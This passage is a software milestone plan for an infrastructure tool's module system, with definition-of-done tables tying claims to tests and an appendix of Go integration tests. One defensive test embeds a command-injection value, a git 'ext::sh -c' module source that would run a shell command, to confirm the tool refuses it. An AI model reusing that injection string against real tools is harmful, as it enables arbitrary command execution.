grep -rn "yaml\." --include=*.go internal/ pkg/ cmd/ | grep -v "^internal/config/"   # prints nothing
go list -deps github.com/infrata/infrata/internal/graph | grep infrata/ # only the module path itself
go list -deps github.com/infrata/infrata/providers/test | grep infrata/internal/     # prints nothing
go list -deps github.com/infrata/infrata/internal/executor | grep infrata/internal/cli  # prints nothing
```

### Definition of Done

Every line names the command run or the test that proves it. **A line that cannot be
proven is reported as NOT MET, with what is missing — it is never ticked.** In M3 a
checklist line claimed behaviour that shipped asserted by a checkbox and exercised by
nothing. A checkbox is not evidence; a named test that fails when the behaviour is
removed is. Where a line belongs to another task and that task did not deliver it,
report it against that task rather than ticking it here.

**Stage 5 exists and is in the right place**

| # | Claim | Proof |
|---|-------|-------|
| 1 | A module's inputs are evaluated in the caller's scope, after variable resolution | `TestCompileExpandsAModuleAfterVariablesAreResolved` (8.2) |
| 2 | Expansion happens before reference binding and before whole-graph validation | `TestCompileExpandsAModuleBeforeReferencesAreBound` (8.2) |
| 3 | A project with no modules passes through stage 5 unchanged | `TestCompileWithoutModulesIsUnchanged` (8.6), plus the whole M2/M3/M4 suite staying green (10.14) |
| 4 | The stage-5 halt's cost is known and pinned | `TestCompileStopsAfterModuleErrors` (8.6) and the sabotage run in 8.7. Tick only after seeing the sabotaged build fail |
| 4a | A sensitive module input is never re-serialized through `Expr.String()` | `TestASensitiveAttributeInsideAModuleStaysRedacted` (10.6) is the behavioural guard — it fails with the literal `<sensitive>` as the applied password if stage 5 ever round-trips a substituted expression back into `AttributeDecl.Value`. Which return type `Expand` has is Tasks 4-7's ruling; that this cannot happen is not negotiable either way |
| 4b | A rejected attribute records no dependency edge, but an UNREGISTERED type still does | the `len(target.names) > 0` guard in step 8.10, reasoned in place: reversing it turns one unknown-type diagnostic from stage 7 into one per reference to that type |
| 5 | `Options.Dir` reaches stage 5 from `--chdir` | every integration test in Task 10 runs under `--chdir`; `grep -rn "compiler.Options{"` names only `varopts.go` (8.8) |

**Contract Ruling 1 — a `Reference` names a resource by address**

| # | Claim | Proof |
|---|-------|-------|
| 6 | Two modules each declaring a resource of the same name resolve their own | `TestTwoModulesEachDeclaringADbResolveTheirOwn` (8.9), asserting the dependency edge each side produces, and `TestTwoModulesEachDeclaringADbAreDifferentResources` (10.2b) through the binary. Task 1's `TestAttributeRefusesAnUnqualifiedReference` guards the same property at the unit level, failing if `Qualify` is skipped or patched around with a bare-name fallback in `ResourceScope.Attribute`; the three meet without overlapping |
| 7 | The root case stayed ergonomic — no ceremony line at the 18 construction sites | Tasks 1-3's to prove. Not ticked here |
| 7a | One spelling of "which resource": `Reference` is option (b), `Reference{Target address.Address; Attribute string}`, with `String` and `InModule` delegating to `address.Address` | Task 1's to prove. Recorded here so the milestone's checklist names the shape that shipped rather than leaving Ruling 1 open |
| 7b | A reference is parsed **scope-relative** — an empty module path means "in whichever scope this expression was written" — and is made absolute before anything resolves against it | Task 1's wording, adopted deliberately: "root-scoped" would be false of every reference written inside a module. Stage 2 builds no `Reference` at all (it keeps interpolated text verbatim behind `HasExpressions`). Proved indirectly here by line 6 and by `TestAModuleOutputReachesTheCallerAndMayBeUnknown` (10.3) |
| 7c | A scope-relative reference is made absolute at **stage 6**, by `Qualify`, before anything reads a reference out of the tree | Amendment 7. An earlier draft of this line said stage 5 re-roots module-output references and cited `Expr.References()` returning copies as the reason stage 6 could not; **both halves are withdrawn** — Author A retracted the module-outputs story, and the copies objection was only ever an argument against parse-then-re-root-what-References-yields, which is not the design. `Qualify(e)` returns the qualified tree and that tree is what gets stored, so it does not apply. Stage 5 records the scope per instantiated resource and re-roots no references, because at stage 5 an attribute's interpolation is still text. Proved by `TestTwoModulesEachDeclaringADbResolveTheirOwn` (8.9) and, end to end, by `TestTwoModulesEachDeclaringADbAreDifferentResources` (10.2b) |
| 7e | `compileScope` is gone, not supplemented | `grep -rn "compileScope" --include=*.go .` prints nothing (8.11). Two implementations of "what is in scope here" is the shape that leaked a plaintext secret in M2 |
| 7f | `Reference.InModule` is either used or deleted | the grep in 8.11. Tasks 1-3 ship it as the primitive `Qualify` applies and asked explicitly that Task 8 delete it if `Qualify` sets `Target.Module` from the scope's path directly. An unused primitive shipped because it looked right is the trap Task 9's first draft fell into |
| 7d | A module output's reference binds to the module's OWN resource, not to a root resource of the same name | `TestAModuleOutputBindsToTheModulesOwnResource` (10.3a). This needed its own test: the mis-scoped case produces no diagnostic (stage 6 checks only that the referenced RESOURCE exists, and nothing validates a referenced attribute) and the same unknown value (the compile-time scope reports every resource attribute as unavailable), so exit code and rendered line are identical. Only the dependency edge differs, and only a destroy renders it. Every other test in this suite passes against the mis-scoped implementation |

**Contract Ruling 2 — stage 5 never sees a `yaml.Node`**

| # | Claim | Proof |
|---|-------|-------|
| 8 | YAML handling stayed inside `internal/config` | the `grep -rn "yaml\."` check in 8.8 and 10.14 prints nothing |

**Contract Ruling 3 — inputs and the module-defaults rung**

| # | Claim | Proof |
|---|-------|-------|
| 9 | A module's own `default:` fills `ScopeModuleDefault` and renders as such | the `from module default` assertion in `TestAModuleIsInstantiatedUnderModuleQualifiedAddresses` (10.2) |
| 10 | A caller's explicit input is NOT `ScopeModuleDefault` | the two `size: 20` assertions in the same test. The exact `Source` word is Tasks 4-7's choice and this does not constrain it — `SourceExplicit` + `ScopeBaseConfig` renders bare, which is the shape Ruling 3 describes — but the rung is constrained, and a caller's value rendering `from module default` fails |
| 11 | An input's declared `type` is checked by `internal/variables`' existing `Schema` | Tasks 4-7's to prove, by grep: no second type checker. Not ticked here |

**Contract Ruling 4 — `${name.attr}` is resolved by stage 5**

| # | Claim | Proof |
|---|-------|-------|
| 12 | A module instantiation's output is readable as `${module.output}` | `TestAModuleOutputReachesTheCallerAndMayBeUnknown` (10.3) |
| 13 | An undeclared reference is reported, and the known-resources list it offers includes module instances alongside provider resources | `TestAReferenceToAMistypedInstanceNamesTheRealOnes` (10.4). **Ruling 4 narrowed under Amendment 8**: an instance IS a resource, so `${database.endpoint}` carries no module-vs-resource ambiguity at the caller and there are no longer "both possibilities" to name. What survives is that `sortedNames(declared)` must list instances too — a user who mistypes one and sees a list without it concludes the module never loaded |
| 12a | A module is LOADED by a `modules:` list entry and INSTANTIATED by a resource of type `module.<name>` | every fixture in Tasks 8-10 uses that shape; `TestTheCanonicalAddressFormIsWhatThePlanPrints` (10.1) is the narrowest case |
| 12b | `module.` with nothing after it, and a name containing a further dot, are each reported | `TestAMalformedModuleTypeIsReported` (10.7a), both sub-cases. Implementation is Tasks 4-7's; this is the user-visible half |
| 12c | A provider cannot claim the `module.` namespace | `TestRegisterRefusesTheModuleNamespace` (8.12), plus `TestRegisterAcceptsATypeMerelyContainingModule` for the boundary. **Deliberately NOT tested by asserting a `module.foo` resource in config is rejected by the registry** — stage 5 expands instances away before stage 7 consults it, so that test would pass with the guard deleted |
| 13b | A reference to an attribute that does not exist on its target is an error at `validate`, and `apply` creates nothing | **Amendment 11.** `TestAReferenceToANonexistentAttributeIsReported` and `TestAReferenceToAComputedAttributeIsStillFine` (8.9a), `TestAReferenceToANonexistentAttributeFailsAtValidate` (10.4c). The measured failure was not a confusing message: `apply` CREATED `store` for real and then failed on `db`, so 10.4c asserts `state list` shows nothing rather than asserting on plan text — a phantom attribute renders identically to a legitimate computed reference, so plan output is correct in both worlds |
| 13c | An output a module does not declare is reported, at the SAME call site as the general attribute check | `TestAMisspelledModuleOutputIsDistinguishedFromAnUnboundName` (8.9b), `TestAReferenceToAnUndeclaredModuleOutputIsReported` (10.4b), plus both deletions in 10.4b. **Amendment 11's "extends rather than parallels" is achieved**, which an earlier draft reported unachievable — correctly, against the design of the time, in which `Qualify` owned the diagnostic and folded every output reference away. Amendment 13c's redesign (single-return `Qualify`, no diagnostics, `Scope.OutputNames`) is what made one call site possible; the fold survives only for outputs that DO exist, which is what keeps Ruling 5 working |
| 13e | Ruling 4's wording — an unbound name names BOTH possibilities and lists what IS in scope | `TestAnUnboundNameNamesBothPossibilities` (8.9b), including its negative assertion. **This is the only test of that wording anywhere.** `Qualify` emits no diagnostics, so Tasks 4-7's tests pin the candidate DATA (correct, sorted) and not the message; "no such resource" alone reads perfectly well and would satisfy every other test in the suite |
| 13d | The check is about whether the NAME is real, never whether the value is known | `TestAReferenceToAComputedAttributeIsStillFine` (8.9a). Every dependency edge in every fixture is a reference to a computed attribute; a check that rejected those would break the product, and this is the test that fails first if 8.10 overreaches |
| 13a | An output's `value:` is a `${...}` reference, and the bare dotted form is refused with an action naming both spellings | `TestABareDottedOutputValueIsRefused` (10.4a). `PLAN.md` §11's example wrote the bare form and is corrected in 10.13 — an authoritative spec showing syntax the implementation refuses is a defect in the spec, not a reason to accept it |

**Contract Ruling 5 — an output may be unknown**

| # | Claim | Proof |
|---|-------|-------|
| 14 | A module output reading a computed attribute stays unknown to the page, as the renderer's unknown text — not an empty string, not a coercion failure | `TestAModuleOutputReachesTheCallerAndMayBeUnknown` (10.3), asserting the exact line `database_url: (known after apply)` |
| 15 | `value.Coerce`'s unknown branch, defensive since M4, is reached | **Reported as a question against Tasks 4-7, not ticked here.** The branch is `k == KindInt && v.Kind == KindFloat && !v.Known`, so reaching it needs an unknown FLOAT, and `providers/test` declares no float attribute. The path that exists is an input declared `type: float` left unresolved — `internal/variables` stamps the declared kind onto an unknown (`resolve.go:327`) — then used where an int is wanted. If Tasks 4-7 stamp a module input's declared kind the same way, a unit test in `internal/compiler` reaches it; if they do not, Ruling 5's "a test must reach it" is unmet and needs either that stamping or a float attribute on the fake provider. Line 14 is the user-visible half and is independent of this |

**Contract Ruling 6 — bounded recursion and cycles**

| # | Claim | Proof |
|---|-------|-------|
| 16 | A module instantiating itself transitively is a diagnostic, not a stack overflow | `TestAModuleCycleShowsTheCycle` (10.5) |
| 17 | The cycle diagnostic SHOWS the cycle | the `strings.Count(chain, "ping") >= 2` assertion on the single chain line (10.5) |
| 18 | Depth 32 is bounded and reported, and the bound counts INSTANTIATIONS not loads | `TestExcessiveModuleNestingIsItsOwnDiagnostic` (10.5), plus its two-deep discrimination run. Amendment 12b: 41 discovered modules are all at depth 1, so discovery alone can never exhaust the bound. A bound on loads would make a project's module COUNT a compile failure |
| 17a | A module exposes OUTPUTS, not resources, and a user cannot reach a module's internals | **Two guards, two doors, neither in this task.** Task 1 rejects a `module.` segment at PARSE time, so `${module.prod.database.id}` is refused as a reference (Amendment 14a); Task 2 rejects it at DECODE time, so `resources: { module.prod.database: ... }` is refused as a logical name (Amendment 16a) — that spelling currently validates, applies, and writes a state key identical to the canonical address of `database` inside instance `prod`. Either door alone leaves the other open. **Not tested here, and deliberately so**: step 8.10's target map is keyed by canonical address, so `${module.prod.database.id}` would resolve against it if the parser ever accepted that spelling. The guard belongs where the two are distinguishable — at parse time, before `Qualify` has run — and a test in this file could not tell a parser that rejects it from one that never sees it. No fixture in Tasks 8-10 writes a reference of more than two segments; `grep -oE '\$\{[a-z_]+\.[a-z_]+\.[a-z_]+\}'` over this file prints nothing |
| 18a | The canonical address stays module-prefixed at every level | `TestTheCanonicalAddressFormIsWhatThePlanPrints` (10.1), the one literal every other header assertion derives from. Amendment 12a: a flat `prod.database` would be the same shape as the output reference `prod.endpoint`, so `state show prod.database` could not be told from one |
| 19 | Depth and cycle are different diagnostics | the summary-comparison assertion in the same test, which hard-codes neither wording |

**Contract Ruling 7 — after stage 5, nothing downstream knows modules exist**

| # | Claim | Proof |
|---|-------|-------|
| 20 | Resources are instantiated under module-qualified addresses | `TestAModuleIsInstantiatedUnderModuleQualifiedAddresses` (10.2), including the absence assertion that no unqualified `test.database.store` is rendered |
| 20a | Modules nest, and a nested address carries every level | `TestAModuleInstantiatesAModule` (10.2a): `module.platform.module.storage.store`, with absence assertions against both one-level spellings. A module path is a loop, and a one-level fixture cannot tell a loop from a hard-coded first element |
| 20b | An output may read another module's output, not only a resource's attribute | the `dsn` assertion in `TestAModuleInstantiatesAModule` (10.2a) |
| 21 | Stage 8's requirement checking sees a module's resources | `TestAModuleOutputReachesTheCallerAndMayBeUnknown` (10.3): `test.application` requires a `test.database` that only the module supplies, and the plan succeeds |
| 22 | The planner, executor and state need no module knowledge | the apply-then-replan-clean arms of 10.3 and 10.6, plus `grep -rln "module" internal/planner internal/executor internal/state --include=*.go \| grep -v _test.go`. Measured against HEAD before M5: that command prints NOTHING. After M5 it must print exactly `internal/planner/render.go` — the move note of 10.9, which is a rendering concern and not module knowledge. Any other file appearing there is stage 5 having failed to flatten |
| 23 | Cost one: a diagnostic names which instantiation it came from | `TestADiagnosticInsideAModuleNamesTheInstantiationItCameFrom` and `TestAModuleDiagnosticNamesOnlyTheFailingInstantiation` (9.4) |
| 24 | Cost one reaches stage-2 diagnostics too, raised by a stage that knows nothing of modules | `TestAStageTwoDiagnosticInsideAModuleIsAttributedToTheInstantiation` (9.7) |
| 25 | Cost two is DOCUMENTED where a user meets it | `CLAUDE.md`'s new architectural bullet (10.13) and the plan note, `TestRenderNotesAResourceThatMayHaveMovedBetweenModules` (10.8) |
| 26 | Cost two is TRUE, and known to be | `TestMovingAResourceBetweenModulesDestroysAndRecreatesIt` (10.11): rename the instantiation, change nothing else, get a destroy and a create |
| 27 | The move note does not fire on anything that merely resembles a move | `TestRenderDoesNotNoteUnrelatedDestroysAndCreates` (different logical name) and `TestRenderDoesNotNoteADestroyWithNoMatchingCreate` (nothing created; created resource of a different type), both 10.8, plus the final arm of 10.11. A warning that fires on ordinary destroys teaches people to skip the one that matters |

**What this milestone must not break**

| # | Claim | Proof |
|---|-------|-------|
| 28 | Acceptance invariant 6: expansion order is deterministic | `TestPlanWithModulesIsDeterministic` (10.7), ten runs plus the sorted-order assertion that a stable-but-unsorted implementation fails |
| 29 | Acceptance invariant 2: a module project converges to a clean re-plan | the apply-then-replan arm of `TestAModuleOutputReachesTheCallerAndMayBeUnknown` (10.3), asserting exit 0 and `No changes.` |
| 30 | Exactly one redaction path, and a module input may be sensitive | `TestASensitiveAttributeInsideAModuleStaysRedacted` (10.6), including `state show`; the `<sensitive>` grep in 10.14 names only `pkg/value/format.go` |
| 31 | Exactly two third-party dependencies | `git diff --stat go.mod go.sum` prints nothing (10.14) |
| 32 | `internal/graph` imports no other infra package; `providers/*` import no `internal/*` | the two `go list -deps` checks in 10.14 |
| 33 | M4's precedence integration tests pass unchanged, with `ScopeModuleDefault` now populated | `go test -count=1 ./tests/integration/` (10.12) with no edit to `m4_test.go`, `m4_variables_test.go` or `m4_invariants_test.go` — `git diff --stat tests/integration/m4*` prints nothing |
| 34 | No golden moved as a side effect | `git diff --stat internal/planner/testdata/` prints nothing (10.10) |
| 35 | The whole suite passes with the cache disabled, and under `-race` | `go test -count=1 ./...` and `go test -race -count=1 ./...` (10.14) |
| 36 | Documentation reflects the shipped state | `CLAUDE.md` (10.13); the vault note per the repo's documentation rules |
| 36a | A local-only project writes no `modules.lock` and no `.infra/modules/` | `TestALocalOnlyProjectWritesNoLockFileOrModuleCache` (10.7a) |
| 36b | Remote sources: unpinned refused, resolved commit recorded, `git` argument guards, `GIT_TERMINAL_PROMPT=0`, cache lock | **Author D's Tasks 11-14, not ticked here.** Amendment 10 lands them in M5 but their integration coverage belongs with the package that implements them |
| 36c | `infra validate` reports a moved tag | **Package-level only, and that is a property of the feature rather than a gap in this suite.** Detecting that a tag moved means asking the remote what the tag points at NOW — `git ls-remote <url> refs/tags/X` — so it needs a live remote on every run (Author D's tasks-11-14.md, 13.6). The scheme allowlist is `https://`, `ssh://` and `git@host:path`, and `file://` is refused by name, so no hermetic fixture can stand one up. Amendment 18b separated the lockfile WRITE from the comparison and made the comparison pure, which is necessary but was never the blocker: a pure comparison still has to learn the tag's current commit from the network. Covered at package level in D's 14.2. See 36e for the half that IS reachable |
| 36e | A lockfile entry that disagrees is refused and NOT rewritten, and editing a pin is not a conflict | `TestALockfileEntryThatDisagreesIsRefusedAndNotRewritten` and `TestEditingAPinIsNotALockfileConflict` (10.7b). The byte-identical-afterward assertion is the one carrying the property: every other assertion in the first test would also pass against a command that reported the mismatch and then rewrote the file, which is the silent failure being guarded. The comparison is keyed on source AND ref (Amendment 20c), so a deliberate bump is a new entry rather than an error. Uses `source.PrepopulateCache` (D's 13.6a) through D's own wrapper — one copy shared by both suites, and never a locally recomputed cache path |
| 36f | `validate` never writes `modules.lock` | the byte-identical assertion in 10.7b. Note this guarantee is INVISIBLE at `internal/cli/validate.go` — it is the absence of a call — so per Amendment 20e it is carried as a comment by whichever command DOES write the lock. A test here is the only executable form it has |
| 36d | `infra init` teaches the difference between a lock file and a cache | **Not applicable in M5 and not a gap.** `init` does not exist (`CLAUDE.md` lists it absent until M5-M7), so there is no scaffolding to update. Recorded so that whoever builds `init` gitignores `.infra/` and does NOT gitignore `modules.lock` |
| 37 | `PLAN.md` §11 no longer shows an output form the implementation refuses | the edit in 10.13, plus `TestABareDottedOutputValueIsRefused` (10.4a) proving the old form is refused. The configuration language is a product API; its spec showing invalid syntax is the kind of trap this milestone is otherwise busy removing |

---

## Definition of done

Numbering continues Author C's table.

**Amendment 10's four correctness surfaces**

| # | Claim | Proof |
|---|-------|-------|
| 38 | An unpinned remote is an error, in every form it can be written | `TestParseRefusals/an_unpinned_https_remote` and `/an_unpinned_scp-shorthand_remote` (11.2). The scp case is the one a naive implementation gets wrong silently — 11.6 sabotage 1. End to end: appendix test 1, owed by the wiring task |
| 39 | A tag's resolved commit is recorded, and a moved tag is reported | `TestWriteLockfileWritesTheWholeSetSorted` (14.2a) and `TestCheckReportsAMovedTagAndNeverAdoptsIt` (14.2) |
| 39d | Editing a pin is not a mismatch; a moved ref is | `TestBumpingAPinIsANewEntryNotAMismatch` and `TestAHashPinnedSourceIsRecordedAndChecked` (14.2b). Amendment 20c: the key is `(source, ref)`, and keying on the source alone turns every version bump into an error |
| 39a | A mismatch is an ERROR and is never adopted | the second assertion of `TestCheckReportsAMovedTagAndNeverAdoptsIt`: the file is byte-identical afterwards |
| 39b | The comparison writes nothing, so `infra validate` stays a reader | `TestCheckIsAPureRead` (14.1) and `TestResolveWritesNoLockfile` (14.3), the same rule asserted from both sides |
| 39c | The lockfile is written once with a complete set, never incrementally | `WriteLockfile`'s signature takes `[]Record` — there is no per-entry entry point to misuse — plus 14.2a. This is the M4 `ae1e309` shape designed out rather than guarded against |
| 40 | The recorded commit is the COMMIT, not an annotated tag's own object | `TestFetchCommitPeelsAnAnnotatedTagToItsCommit`, `TestLsRemoteCommitPeelsAnAnnotatedTag` (12.2). Without this every annotated-tag module reports a move that never happened |
| 41 | A moved tag's suggested action works with the commands M5 ships | `TestTheDocumentedRemedyWorks` (14.2), and the assertion in `TestCheckReportsAMovedTagAndNeverAdoptsIt` that the Action names neither `infra modules` nor `--upgrade`. The real fix is filed as a follow-up (14.5a), wired to that assertion so whoever adds the flag finds the message |
| 42 | `ext::` is refused by name, and does not run | `TestParseRefusals/an_ext::_transport` (11.2). That it does not EXECUTE is appendix test 2, whose second assertion is the one that makes it a security test — owed by the wiring task, and the one item in the appendix that must not be dropped |
| 43 | A source beginning with `-` is refused | `TestParseRefusals/a_flag` (11.2); 11.6 sabotage 2 |
| 44 | `file://` and every non-allowlisted scheme are refused | `TestParseRefusals` (11.2) |
| 45 | A source cannot be served over a transport it does not name, however the user's gitconfig rewrites it | `TestGitRefusesATransportTheLocationDoesNotName` (12.3). Amendment 17: `GIT_ALLOW_PROTOCOL` is the guard, `Parse`'s allowlist is the diagnostic. The same test is the canary if a future git stops honouring it |
| 46 | A remote asking for credentials fails rather than hangs | `TestFetchDoesNotHangWhenTheRemoteAsksForAPassword` (12.4), with a deadline |
| 47 | `GIT_TERMINAL_PROMPT=0` is set | `TestGitEnvDisablesPromptingAndPinsTheTransport` (12.5) **only**. Measured: with no controlling terminal git fails fast regardless, so this one has no end-to-end failure mode under `go test`. Stated rather than papered over |

**The cache**

| # | Claim | Proof |
|---|-------|-------|
| 48 | Two concurrent runs cannot tear a checkout | `TestResolveIsSafeWhenCallersRace` under `-race` (13.4), plus the rename in `fetch`. The rename's own failure mode is narrower than the test — recorded in 13.8 |
| 49 | The fetch lock is exclusive, waits, and gives up with an actionable diagnostic | `TestResolveWaitsForAnotherProcessAndGivesUpWithADiagnostic` (13.4); sabotage: `Link` → `Rename` |
| 50 | An interrupted or corrupt checkout is discarded, not loaded | `TestResolveReplacesAnInterruptedCheckout`, `TestResolveReplacesACheckoutWhoseMarkerNamesAnotherCommit` (13.3) |
| 51 | A cached commit pin skips the network; a cached tag pin never does | `TestResolveDoesNotFetchAHashPinThatIsAlreadyCached` and `TestResolveChecksATagPinAgainstTheRemoteEveryTime` (13.2), both proved by DELETING the remote |
| 52 | A fetched module cannot reach outside its own checkout | `TestResolveRefusesAPathSourceThatEscapesAFetchedCheckout` (14.3) |
| 53 | A project with no remote sources writes no `modules.lock` and no cache | `TestWriteLockfileWritesNothingForAProjectWithNoRemotes` and `TestPinSkipsAPathSource` (14.2a), and Author C's `TestALocalOnlyProjectWritesNoLockFileOrModuleCache` (their 10.7a) |

**Global constraints**

| # | Claim | Proof |
|---|-------|-------|
| 54 | Exactly two third-party dependencies | `git diff --stat go.mod go.sum` prints nothing (14.9) |
| 55 | `yaml.v3` stays inside `internal/config` — `modules.lock` is JSON | the grep in 14.9 |
| 56 | One redaction path | the `<sensitive>` grep in 14.9 names only `pkg/value/format.go`. This package never needs one, because `Parse` refuses a source carrying credentials (11.2) |
| 57 | `modules.lock` is deterministic | sorted by `(source, ref)` where it is produced (14.5), read back in order in `TestWriteLockfileWritesTheWholeSetSorted` (14.2a), which feeds it unsorted input so a map-order implementation fails |
| 58a | `Source.String()` round-trips exactly, so `infra export` can regenerate a user's own spelling | `TestStringRoundTripsEveryAcceptedSource` (11.2b), a property over every accepted form; 11.6 sabotage 3 |
| 58c | The cache layout is known in exactly one place | `source.PrepopulateCache` (13.6a) is the only way to build an entry from outside, and `TestPrepopulateCacheProducesAnEntryResolveAccepts` fails if the layout moves without it. Both integration suites — the appendix's and Author C's 10.7b — wrap that one function |
| 58b | `Cache.Resolve` matches Author B's injected `Resolver` exactly | the signature in Task 13's Interfaces; the compile-time assertion lives in `internal/modules` and is B's, because asserting it here would need the reverse import |
| 58 | Name derivation and parsing split the same string once | `TestDeriveName` and `TestDeriveNameRefusesWhatIsNotAnIdentifier` (11.2a); 11.6 sabotage 3 is the discrimination step for the strip order |
| 59 | This package can be imported by `internal/config` without a cycle | the `go list -deps` check in 14.6: it must not list `internal/config` |
| 60 | Documentation reflects the shipped state | **owed by the wiring task**, text supplied in the appendix. A user-facing capability is documented in the change that makes it reachable; documenting it here would describe something no command can do yet |

**Not covered, and why**

| # | Claim | Status |
|---|-------|--------|
| 61 | A real fetch over `https://` or `ssh://` end to end | **Not testable here.** No network in tests, and neither transport can be served from a temp directory. Covered against a local bare repo at package level (Tasks 12-13) with the seam stated in "What is NOT here"; the CLI reaches `KindGit` through the pre-populated-cache route, appendix test 3 |
| 62 | A moved tag reported by `infra validate` (Author C's DoD 36c) | **Package level only** — `TestCheckReportsAMovedTagAndNeverAdoptsIt` (14.2), plus `TestCheckIsAPureRead` for the half that makes it reachable from a read-only command. Detecting a move needs `ls-remote` against a live remote on every run, so the pre-populated-cache route cannot reach it |
| 63 | The rename in `fetch` (13.6) | **Weaker than the rule.** Recorded in 13.8 with what its absence would cost: no test in the suite fails deterministically, and saying so is the point. The `prune` weakness that used to sit beside it is GONE rather than accepted — Amendment 18 replaced the flag with "write the complete set, once", which has nothing to get wrong |
| 64 | The wiring in "The consumer contract" happened as specified | **Not this package's to prove.** Listed so it is visibly unticked: stage 2 surfacing `Parse`'s diagnostics, stage 5 not re-parsing, and the guard deleted in the same commit as the `Resolve` call |

---


---

## Appendix — what the wiring task owes this package

None of this is Tasks 11-14. It is specified here because the behaviour it covers belongs
to this package and would otherwise be re-derived, badly, by whoever wires stage 2 and
stage 5. Hand it to that task with the consumer contract at the top of this file.

### The three integration tests

`tests/integration/m5_remote_modules_test.go`, using the existing `project`,
`projectWithFiles`, `run` and `requireContains` helpers:

```go
package integration

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/infrata/infrata/internal/modules/source"
	"github.com/infrata/infrata/pkg/value"
)

// prepopulateCache creates a valid cache entry for a hash-pinned source inside
// dir's project cache, so that resolution skips the network (13.6).
//
// It goes through source.PrepopulateCache rather than building
// .infra/modules/<hash>/<ref>/ here. A copy of that layout in this package
// would keep passing after the layout changed and quietly stop testing
// anything, because a cache miss against example.invalid fails looking exactly
// like an ordinary network error.
func prepopulateCache(t *testing.T, dir, location, commit string, files map[string]string) {
	t.Helper()
	s, ds := source.Parse(location+":"+commit, value.Origin{})
	if ds.HasErrors() {
		t.Fatalf("parsing %q: %+v", location+":"+commit, ds)
	}
	if err := source.PrepopulateCache(dir, s, commit, files); err != nil {
		t.Fatalf("prepopulating the cache: %v", err)
	}
}

func TestPlanRefusesAnUnpinnedRemoteModuleSource(t *testing.T) {
	dir := project(t, `
project: myapp
modules:
  - https://github.com/acme/infra-networking
resources:
  net:
    type: module.infra_networking
`)
	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 1 {
		t.Fatalf("plan exit = %d, want 1\n%s", r.ExitCode, r.combined())
	}
	requireContains(t, r.combined(), "is not pinned")
	requireContains(t, r.combined(), ":v1.2.0")
}

// TestAnExtTransportSourceIsRefusedAndDoesNotRun is a security test, and the
// assertion that makes it one is the second: git's ext:: transport runs its
// address as a shell command, so the marker file existing would mean `infra
// plan` executed an attacker's command. A test that only checked the message
// would pass just as happily against an implementation that ran the command
// first and complained afterwards.
//
// This is the one test in this appendix that must not be dropped.
func TestAnExtTransportSourceIsRefusedAndDoesNotRun(t *testing.T) {
	dir := project(t, "")
	marker := filepath.Join(dir, "executed")
	body := `
project: myapp
modules:
  - "ext::sh -c 'touch ` + marker + `'"
resources:
  net:
    type: module.sh
`
	if err := os.WriteFile(filepath.Join(dir, "infra.yml"), []byte(body), 0o644); err != nil {
		t.Fatalf("write infra.yml: %v", err)
	}

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 1 {
		t.Fatalf("plan exit = %d, want 1\n%s", r.ExitCode, r.combined())
	}
	requireContains(t, r.combined(), "ext::")
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatalf("the ext:: command RAN (stat err = %v): a module source executed a shell command during planning", err)
	}
}

// TestPlanUsesAPrePopulatedCacheWithoutTheNetwork is the one route by which a
// KindGit source reaches the CLI in a test: a commit pin whose cache entry is
// already valid skips the network entirely (13.6). The location points at
// example.invalid, so if that rule is removed the test fails by trying to reach
// it — which is exactly the failure worth having.
//
// Where the cache lives is source's business, not this package's: the helper
// above is the only thing here that knows a cache exists.
func TestPlanUsesAPrePopulatedCacheWithoutTheNetwork(t *testing.T) {
	const (
		location = "https://example.invalid/infra-db"
		commit   = "34d6815f4599c14a529743d34402000ca8e52f7f"
	)

	dir := project(t, `
project: myapp
modules:
  - `+location+`:`+commit+`
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  primary:
    type: module.infra_db
    network: ${net.id}
`)
	prepopulateCache(t, dir, location, commit, map[string]string{"module.yml": `
inputs:
  network:
    type: string
resources:
  store:
    type: test.database
    engine: postgres
    network: ${network}
outputs:
  endpoint:
    value: ${store.endpoint}
`})

	r := run(t, dir, "plan", "dev")
	if r.ExitCode != 0 {
		t.Fatalf("plan exit = %d, want 0\n%s", r.ExitCode, r.combined())
	}
	requireContains(t, r.combined(), "module.primary.store")

	data, err := os.ReadFile(filepath.Join(dir, "modules.lock"))
	if err != nil {
		t.Fatalf("modules.lock was not written: %v", err)
	}
	for _, want := range []string{location, commit, `"version": 1`} {
		if !strings.Contains(string(data), want) {
			t.Errorf("modules.lock does not contain %q:\n%s", want, data)
		}
	}
}
```

**Author C's Task 10 uses the same helper** (its 10.7b, for the lockfile's
never-silently-adopt property, which is hermetically reachable only because Amendment 20c
records hash pins too). Its step names it `prepopulateCache`; the wrapper above is that
function, and the two suites must share one copy rather than growing two.

`module.infra_db` is `source.DeriveName`'s answer for
`https://example.invalid/infra-db` (last segment, `-` to `_`). It is written out here
rather than computed so that a change in derivation fails this test loudly.

### The `CLAUDE.md` entry

Added by the change that makes remote sources reachable, not before. To "Current state":

> Remote module sources land with M5: `https://`, `ssh://` and `git@host:path`, each
> requiring a `:tag-or-hash` pin, parsed at stage 2 so a bad source is reported by
> `validate` at its own line before anything is fetched, then fetched into `.infra/modules/`
> and recorded in `modules.lock`. `modules.lock` is committed; `.infra/` is not. A tag that
> moves is a reported error naming both commits, not a plan that quietly differs. `ext::`,
> `file://`, other schemes, a leading `-` and a URL carrying credentials are refused by
> name.

And to "Invariants that must always hold", under invariant 6:

> An unpinned remote module source is refused rather than defaulted to `HEAD`: determinism
> that depends on a branch not moving is not determinism.
